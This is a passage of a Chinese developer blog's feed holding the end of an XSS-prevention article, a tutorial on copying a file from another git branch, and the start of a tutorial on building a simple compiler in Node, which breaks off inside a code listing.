XSS一大原则就是不要信任用户输入的内容！所有用户输入的内容都可以默认为不可控的、不安全的，包括但不限于表单输入/URL 等可以由用户任意输入的来源。在回显用户的输入时候一定要做XSS 的过滤和相应的编码。</p><h2 id="浏览器内置的安全机制">浏览器内置的安全机制</h2><p>开启 X-XSS-Protection：针对反射型 XSS的一种浏览器防御机制，现在大部分现代浏览器已经废弃了这个属性。</p><p>内容安全策略 CSP：CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS 攻击所依赖的载体。一个 CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本(包括内联脚本和 HTML 的事件处理属性) 浏览器的同源策略。</p><p>Cookie 安全：设置 Cookie 的 HttpOnly 属性，能够最大限度的保证你的Cookie 不会被脚本所读取并发送到其他服务器上。</p><h2 id="使用成熟的框架安全机制">使用成熟的框架安全机制</h2><p>对于前端来说，使用常用的库，React/Vue/Angular等流行框架来渲染数据基本上都不会有太大的问题。需要注意的是，必须非常非常非常慎重使用类似React 的 dangerouslySetInnerHTML 或者 Vue 的 v-html 这类绕过 XSS过滤能力的属性。</p><p>不少后端服务的框架也都在设计时就考虑了 XSS 的安全问题，如 Ruby onRails。当然这类防御措施还是有其局限性的，并不是能一劳永逸的解决所有攻击威胁的。</p><h2id="在没有框架安全机制保证下需要避免的操作">在没有框架安全机制保证下需要避免的操作</h2><p>对于前端来说，主要需要针对处理的是 DOM-based 的 XSS 威胁。</p><p>在使用 Vanilla JavaScript 需要避免那些能够直接修改 HTML 的操作，如innerHTML/outerHTML 属性或者 document.write之类的方法。当需要展示文本的时候，选择如 textContent/innerText之类安全的方法。当需要创建 HTML 标签的时候，选择createElement/appendChild 之类的方法。</p><p>还有就是更加危险的 eval方法，虽然一般不会使用，但是需要避免一些隐式的 eval 使用，比如setTimeout/setInterval 就可以通过 setTimeout(codeAsString, delay)的形式执行任意字符串代码。</p><p>除此之外还有 HTML 标签上的一些事件属性等等。</p><p>如果无可避免的要使用类似方法，一定在渲染前做好过滤和编码工作。</p><h2 id="更加细致的防范-cheatsheet">更加细致的防范 CheatSheet</h2><p>开放式 Web 应用程序安全项目 （ OWASP）提供了针对 XSS 防御的详尽CheatSheet，感兴趣的同学可以作为参考。</p><p>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm</p><p>https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</p><h2 id="安全检测">安全检测</h2><p>一些工具可以扫描网站存在的 XSS 漏洞，可以方便查缺补漏</p><p>https://github.com/s0md3v/XSStrike</p><p>https://www.zaproxy.org/</p><h2 id="最后的最后">最后的最后</h2><p>需要注意，以上这些防御措施不能详尽描述每个细节和抵御所有 XSS攻击方式。针对 XSS的攻防战没有一劳永逸的银弹，也没有傻瓜式的解决方案。只有严格遵照安全最佳实践来尽量避免，并提升安全防范的意识，加强安全审计的工作。</p><p>钓鱼攻击： 主要是发生在提交的 HTMl内容的时候带有一些其他的域名地址，这些域名地址存在钓鱼的风险。 防范方式通过 securitykit.surl 方法进行校验，该方法对非白名单的地址进行剔除。</p><p>XSS防御方案最好是在编译时合运行时提供相关的预防方案：编译时预防开发人员出现存在安全漏洞的代码；运行时尽量不相信用户的任何输入</p><ul><li>运行时：提供运行时过滤API，能够过滤不在白名单上的标签以及常见的伪协议字符串。</li><li>编译时：提供 Babel 插件进行 AST 风险点识别，在风险点中包裹运行时过滤API，起到自动防御的能力。</li></ul><h2 id="参考文章">参考文章：</h2><p>https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端，xxs，跨站脚本攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git checkout 妙用</title>
    <link href="/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/"/>
    <url>/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>当你在 Git中处理一个仓库时，你可能需要从另一个分支中获取（checkout）一个指定的文件。</p><p>幸运的是，Git提供了许多可能的方法来快速完成这项任务。其中一个最简单的解决方案是使用gitcheckout命令，将指定的文件作为一个参数。</p><p>在这篇文章中，我们将分析这个问题的不同解决方案，并介绍每一种解决方案所需要遵循的流程。</p><p>让我们开始吧。😎</p><p>Git Checkout 用例你正在处理一个名为feature/A的分支，其中包含一个名为utils.js的文件。</p><p>你有另一个名为feature/B的分支，里面有一个更新的utils.js文件。</p><p>你想签出该文件，并将其从feature/B分支带到feature/A分支。</p><p>下面是这个任务的三种可行的解决方案。</p><p>解决方案 1：使用 git checkout 命令 gitcheckout命令提供了一个简单的方法来从另一个分支获取文件或文件夹。</p><p>以下是从另一个分支获得（checkout）文件的语法：</p><p>git checkout <other-branch-name> -- path/to/your/folder以下是要遵循的流程：</p><ol type="1"><li>切换（checkout）到你想复制文件的那个分支。</li></ol><p>git checkout feature/A 2. 你在当前分支上，复制该文件。</p><p>git checkout feature/B -- utils.js 3. 使用gitstatus命令来确保文件已经被复制了。</p><ol start="4" type="1"><li>提交并推送到远程。</li></ol><p>在使用 checkout 命令时，你也可以得到：</p><p>一个来自另一个分支的文件夹。 通过指定每一个文件，可以指定多个文件另外，请注意，你可以从 stash 获得一个文件/文件夹。</p><p>解决方案 2：使用 git restore 命令 另一个选择是使用git switch命令和gitrestore命令。</p><p>如果你从未听说过这两个命令，那也没关系。它们是比较新的。Git 在 2019年的 2.23 版本中引入了它们。</p><p>这两个命令的目的是减少使用 git checkout命令，以简化用户的工作。</p><p>git restore命令可以恢复工作树。</p><p>git switch命令切换分支。</p><p>下面是从另一个分支获取文件的过程：</p><ol type="1"><li>切换到你想获取（checkout）文件的分支。</li></ol><p>git switch feature/A 2. 从另一个分支获取文件。</p><p>git restore --source feature/B -- utils.js 3. 提交并推送更改。</p><p>解决方案 3：使用 git show 命令 最后，我们可以使用git show命令。</p><p>以下是要遵循的流程：</p><ol type="1"><li>切换到工作分支。</li></ol><p>git switch feature/A 2. 从另一个分支获取文件。</p><p>git show feature/B:path/utils.js &gt; path/utils.js 3.提交并推送更改。</p><p>注意: 这次你需要指定来自你的目录根的相对路径。</p><p>小结正如你所看到的，从另一个分支获取一个文件并不是什么像发射火箭那样困难。</p><p>当我在日常生活中需要这样做时，我通常使用git checkout命令。</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node从头手写一个简单编译器</title>
    <link href="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    <url>/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>使用语言：node本文涉及：编译器的词法分析，抽象语义树生成，语法分析，代码生成本文重点内容：</p><ol type="1"><li>实现正则表达式分析器</li><li>实现简易版 Flex</li><li>实现 LR0 语法，并简单介绍其他语法(LL, LR1, SLR, LSPR)</li><li>实现简易版 Bison</li><li>实现生成汇编代码</li><li>实现简易编译器功能，提供编译时期类型检查和推断，支持加减乘除支持函数的递归调用，以及</li></ol><p>会包含的：</p><ol type="1"><li>实现 nfa，以及联合 nfa =&gt; dfa，进行词法分析</li><li>实现 dfa，进行语法分析，并基于此构建抽象语法树(AST)</li><li>基于 ast 进行语言义分析(类型检查以及是否符合语言规范)</li><li>基于 ast生成汇编代码，虽然本文没有显示的终中间代码生成过程，但是也有类似的思想</li></ol><p>不会包含的：本语言比较简单，不包含复杂数据结构的支持，如数组对象等其他功能；不会涉及复杂的编译器后端知识：如垃圾回收，寄存器染色，数据流分析等等</p><p>minic 语法：</p><ol type="1"><li>运算符：支持+-*/运算，不支持优先级(, )</li><li>类型：支持自然数(int 类型)，字符串，布尔值以及 void</li><li>语句：支持函数调用，嵌套的 if-else语句（if-else必须成对出现，如下的语法是不允许的）</li><li>和 C 一样，必须要有 main 函数</li><li>变量必须声明的时候同时赋值，如下的声明是不允许的</li><li>允许块级作用域</li><li>允许返回值是条件表达式，运算表达式</li><li>运算符左右两侧仅可以是变量或是数字</li></ol><p>结果示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来从以下几个方面介绍：</p><ol type="1"><li>parser：包含正则表达式生成和词法token生成</li><li>semantic：文法推导式解析和抽象语义树生成</li><li>check：语法和类型校验</li><li>gen：汇编代码生成</li></ol><h2 id="parser">parser</h2><p>在词法分析阶段，输入是字符串，输出是 token流，一开始设计输出是枚举值的数组，类似这样:<code>[TYPE, ID, BRACE, ...]</code>，但是这样会有问题，因为词素值没办法保留下来，所以后面改成了如下输出:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>，(行号，类型,词素值)三元组 学在构建自动机过程中，自动机把输入流转成token流，比如当词法分析器读完 int 的时候，这时候就会返回一个 TYPEtoken，但是如果是 int1，就应该返回一个 IDtoken，所以这里涉及到贪婪读取，另外对于像 if这种关键字，如果同时满足多种终结状态，应该涉及到优先级，这里的优先级比较简单，直接遍历终态节点数组endStates(可以理解为叶子节点)，遇到第一个符合的即返回，所以正则的优先级和前后顺序有关；</p><p>那么如何构建自动机？我们的目标是构建一系列单个正则表达式单元nfa，然后联合成一个大的nfa单元，这个nfa可以解析我们的之前正则单元，再得到联合nfa的邻接矩阵edges，最后根据edges转成dfa，具体步骤如下：</p><p>首先，需要名明确的是，我们的词法分析器支持以下几个单元： +: a+, <em>:a</em>, 连接: ab， 逻辑或: a|b， 字符集: [a-z]支持少部分字符转义，如：, t, </p><p>如何把正则表达式构建为nfa：对于每一个单元正则表达式，可以直接生成对应的节点，但是有些问题我们需要注意：我们的输入是一个个正则表达式，正则表达式本身可以理解为是一个个单元，而这些单元又可能是字符或者其他单元和成的，如：a|b 就是一个单元，但是其组成就是 2 个字符 [a-z]|a就是一个元外加一个普通字符另外对于中括号这种还需要特殊处理，思路如下：即使是单个字符也会抽象成节点的概念，另外在生成自动机的过程中，由于存在[]，+，*等等这样的修饰符号，考虑使用stack进行存储，类比括号匹配算法。(<code>lib =&gt; parser =&gt; nfa =&gt; flex函数</code>)</p><h3 id="构建基本正则单元">构建基本正则单元</h3><p>我们可以提供相应的函数，我们的词法分析器包含以下几种基本正则单元：</p><ol type="1"><li>连接运算符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>: VertexNode, to: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-comment">// from的尾和to的头相互连接,注意circle</span><br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(<span class="hljs-keyword">from</span>.<span class="hljs-property">index</span>); <span class="hljs-comment">// 获取邻接表</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">memo</span>: number[] = [];<br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span> &amp;&amp; !memo.<span class="hljs-title function_">includes</span>(cur.<span class="hljs-property">index</span>)) &#123;<br>    memo.<span class="hljs-title function_">push</span>(cur.<span class="hljs-property">index</span>);<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br><br>  graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<br>    to.<span class="hljs-property">index</span>,<br>    graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">index</span>).<span class="hljs-property">firstEdge</span><br>  );<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>或</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">or</span>(<span class="hljs-params">a: VertexNode, b: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(a.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, a.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">next</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(b.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, b.<span class="hljs-property">edgeVal</span> || <span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeEnd, nodeEnd.<span class="hljs-property">index</span>);<br>  <span class="hljs-title function_">connect</span>(a, nodeEnd);<br>  <span class="hljs-title function_">connect</span>(b, nodeEnd);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>字符集</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">characters</span>(<span class="hljs-params">chars: string[]</span>) &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> nodeEnd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>, chars);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(nodeEnd.<span class="hljs-property">index</span>, chars);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br><br>  <span class="hljs-keyword">const</span> pre = nodeStart.<span class="hljs-property">firstEdge</span>;<br>  nodeStart.<span class="hljs-property">firstEdge</span> = nodeEnd;<br>  nodeEnd.<span class="hljs-property">next</span> = pre;<br><br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*修饰符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mutipliy</span>(<span class="hljs-params">wrapped: VertexNode</span>): <span class="hljs-title class_">VertexNode</span> &#123;<br>  <span class="hljs-keyword">const</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, <span class="hljs-literal">null</span>);<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(wrapped.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = tmp;<br>  <span class="hljs-keyword">let</span> cur = graph.<span class="hljs-title function_">getVertex</span>(wrapped.<span class="hljs-property">index</span>); <span class="hljs-comment">// 获取邻接表</span><br>  <span class="hljs-keyword">while</span> (cur.<span class="hljs-property">firstEdge</span>) &#123;<br>    cur = graph.<span class="hljs-title function_">getVertex</span>(cur.<span class="hljs-property">firstEdge</span>.<span class="hljs-property">index</span>);<br>  &#125;<br>  <span class="hljs-title function_">connect</span>(cur, nodeStart);<br>  <span class="hljs-keyword">return</span> nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+修饰符</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">plus</span>(<span class="hljs-params">base: VertexNode</span>) &#123;<br>  <span class="hljs-comment">// 基于old新建节点</span><br>  <span class="hljs-keyword">let</span> nodeStart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, base.<span class="hljs-property">edgeVal</span>);<br>  nodeStart.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">const</span> res = nodeStart;<br>  graph.<span class="hljs-title function_">addVertexNode</span>(nodeStart, nodeStart.<span class="hljs-property">index</span>);<br>  <span class="hljs-keyword">let</span> cur = base?.<span class="hljs-property">firstEdge</span>;<br>  <span class="hljs-keyword">while</span> (cur) &#123;<br>    <span class="hljs-keyword">const</span> vertexNode = graph.<span class="hljs-title function_">getVertex</span>(cur?.<span class="hljs-property">index</span>);<br>    <span class="hljs-keyword">const</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VertexNode</span>(<span class="hljs-title class_">Graph</span>.<span class="hljs-property">node_id</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart.<span class="hljs-property">firstEdge</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(tmp.<span class="hljs-property">index</span>, <span class="hljs-literal">null</span>, vertexNode.<span class="hljs-property">edgeVal</span>);<br>    nodeStart = tmp;<br>    tmp.<span class="hljs-property">firstEdge</span> = base.<span class="hljs-property">firstEdge</span>;<br>    graph.<span class="hljs-title function_">addVertexNode</span>(tmp, tmp.<span class="hljs-property">index</span>);<br>    cur = vertexNode.<span class="hljs-property">firstEdge</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">mutipliy</span>(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>不过比较困扰的是这些节点的数据结构如何存储是一件要考虑周到的事：需要节点id，由于自动机是有向图，并且可能带环，并且节点和节点之间可能存在不止一条边，考虑了下，还是用邻接表存储(主要是第一版的代码是这样的，再加上如果感觉节点之间的连接可能在某些情况下比较少，临界矩阵比较浪费内存)，firstEdge指向其所有的临界边，edgeVal 是边上的值，对于该图的搜索，使用bfs+dfs+检测环。</p><p>if对应的nfa: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104727865.png" class=""></p><p>[a-z][a-z0-9]* 的nfa为: <img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104740056.png" class=""></p><p>联合后就变成了一个大的nfa，并在终态节点上放置一些动作：<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/image-20230510104921040.png" class=""></p><h3 id="构建邻接矩阵">构建邻接矩阵：</h3><p><code>lib =&gt; parser =&gt; nfa =&gt; build_edges函数</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> edges = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_item</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>);<br>&#125;);<br>edges[起始点][终止点] = [边集合]，如果是epsilon，则是<span class="hljs-literal">null</span><br><span class="hljs-title function_">build_edges</span>() dfs + bfs + 集合去重<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],   ======&gt; <span class="hljs-number">0</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, i, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">1</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, f, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">2</span><br>[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">3</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">4</span><br>    [<br>       a,  b,  c, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>,<br>      <span class="hljs-number">103</span>, <span class="hljs-number">104</span>, <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>,<br>      <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">114</span>,<br>      <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z<br>    ],<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">5</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,======&gt; <span class="hljs-number">6</span><br>    [<br>       a,  b,  c, d, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>, <span class="hljs-number">103</span>, <span class="hljs-number">104</span>,<br>      <span class="hljs-number">105</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">111</span>, <span class="hljs-number">112</span>,<br>      <span class="hljs-number">113</span>, <span class="hljs-number">114</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>,<br>      <span class="hljs-number">121</span>, z,  <span class="hljs-number">0</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">2</span>,  <span class="hljs-number">3</span>,  <span class="hljs-number">4</span>,  <span class="hljs-number">5</span>,<br>       <span class="hljs-number">6</span>,  <span class="hljs-number">7</span>,  <span class="hljs-number">8</span>,  <span class="hljs-number">9</span><br>    ],<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>  ],<br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">7</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],======&gt; <span class="hljs-number">8</span><br>  [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span 